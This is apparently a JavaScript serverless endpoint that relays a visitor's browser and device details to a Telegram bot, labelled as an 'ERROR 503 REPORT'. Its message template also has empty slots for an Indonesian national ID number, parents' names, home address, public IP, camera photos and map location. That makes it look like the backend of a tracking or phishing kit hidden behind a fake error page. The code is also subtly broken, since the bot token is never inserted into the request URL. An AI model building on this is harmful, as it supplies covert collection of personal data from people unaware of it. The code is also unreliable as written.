export const config = {
runtime: "nodejs"
};

function clean(value, max = 500) {
return String(value ?? "-")
.replace(/[\u0000-\u001F\u007F]/g, " ")
.slice(0, max);
}

export default async function handler(req, res) {
if (req.method !== "POST") {
return res.status(405).send("Method Not Allowed");
}

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
return res.status(500).send("ENV belum diset");
}

const input = req.body || {};

const name = clean(input.name, 50);
const platform = clean(input.platform, 100);
const cpu = clean(input.cpu, 30);
const ram = clean(input.ram, 30);
const resolution = clean(input.resolution, 30);
const browser = clean(input.browser, 500);
const timezone = clean(input.timezone, 100);
const language = clean(input.language, 30);
const page = clean(input.page, 300);

const now = new Date();

const date = new Intl.DateTimeFormat("id-ID", {
timeZone: "Asia/Jakarta",
dateStyle: "short"
}).format(now);

const time = new Intl.DateTimeFormat("id-ID", {
timeZone: "Asia/Jakarta",
timeStyle: "medium"
}).format(now);

const message = `
🚨 ERROR 503 REPORT

━━━━━━━━━━━━━━━━━━━━
👤 USER INFORMATION
━━━━━━━━━━━━━━━━━━━━
👤 Name             : ${name}
📍 Place of Birth   : -
🎂 Date of Birth    : -
👨 Father's Name    : -
👩 Mother's Name    : -
👥 Child Number     : -
💍 Marital Status   : -
🪪 NIK              : Not Collected

━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏷️ Brand            : Not Available
📱 Device Model     : Not Available
🧠 OS               : ${platform}
💻 Platform         : ${platform}
⚙️ CPU Cores        : ${cpu}
💾 RAM              : ${ram}
🖥 Resolution       : ${resolution}
🌐 Browser          : ${browser}

🕒 Timezone         : ${timezone}
🗣 Language         : ${language}
🌍 Public IP        : Not Collected

━━━━━━━━━━━━━━━━━━━━
🌎 IP INFORMATION
━━━━━━━━━━━━━━━━━━━━
🌍 Country          : Not Collected
📍 Region           : Not Collected
🏙 City             : Not Collected
🏢 ISP / Org        : Not Collected

━━━━━━━━━━━━━━━━━━━━
🏠 ADDRESS INFORMATION
━━━━━━━━━━━━━━━━━━━━
🏘 Village          : Not Collected
🏙 District         : Not Collected
🏛 City             : Not Collected
🌆 Province         : Not Collected
📮 Postal Code      : Not Collected
🌍 Country          : Not Collected

━━━━━━━━━━━━━━━━━━━━
📷 CAMERA INFORMATION
━━━━━━━━━━━━━━━━━━━━
🤳 Front Camera     : Not Submitted
📸 Rear Camera      : Not Submitted

━━━━━━━━━━━━━━━━━━━━
📐 LOCATION QUALITY
━━━━━━━━━━━━━━━━━━━━
🎯 Quality          : Not Available
📡 Source           : Not Collected

🗺 Google Maps      : Not Available

━━━━━━━━━━━━━━━━━━━━
⚠️ ERROR INFORMATION
━━━━━━━━━━━━━━━━━━━━
🚨 Error Code       : 503
📝 Message          : Service Unavailable
🔄 Action           : Retry

🌐 Page             : ${page}

━━━━━━━━━━━━━━━━━━━━
⏰ TIME INFORMATION
━━━━━━━━━━━━━━━━━━━━
📅 Date             : ${date}
🕒 Time             : ${time}

━━━━━━━━━━━━━━━━━━━━
✅ END OF REPORT
`;

try {
const telegram = await fetch(
"https://api.telegram.org/bot${BOT_TOKEN}/sendMessage",
{
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({
chat_id: CHAT_ID,
text: message
})
}
);

const result = await telegram.json();

if (!telegram.ok || !result.ok) {
  return res.status(502).json({
    success: false,
    message: "Telegram gagal mengirim laporan"
  });
}

return res.status(200).json({
  success: true,
  message: "Report sent"
});

} catch (error) {
return res.status(500).json({
success: false,
message: "Gagal mengirim laporan"
});
}
}
